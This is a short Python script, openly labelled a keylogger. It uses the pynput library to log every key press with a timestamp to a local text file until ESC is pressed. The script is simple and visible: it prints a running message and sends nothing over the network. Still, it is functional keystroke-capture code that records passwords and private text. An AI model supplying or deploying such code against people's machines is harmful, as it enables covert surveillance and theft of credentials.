from pynput.keyboard import Key, Listener
import logging
import os

# Log file to store keystrokes
log_file = "keylogger_output.txt"

# Set up logging configuration to write keystrokes to a file
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

# Function to handle key press events
def on_press(key):
    try:
        # Capture regular key presses
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Capture special keys like space, enter, etc.
        logging.info(f'Special key pressed: {key}')

# Function to handle key release events
def on_release(key):
    # Stop the listener when the ESC key is pressed
    if key == Key.esc:
        return False

# Start the listener to capture keypresses
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("[Linux] Keylogger is running...")
    start_keylogger()
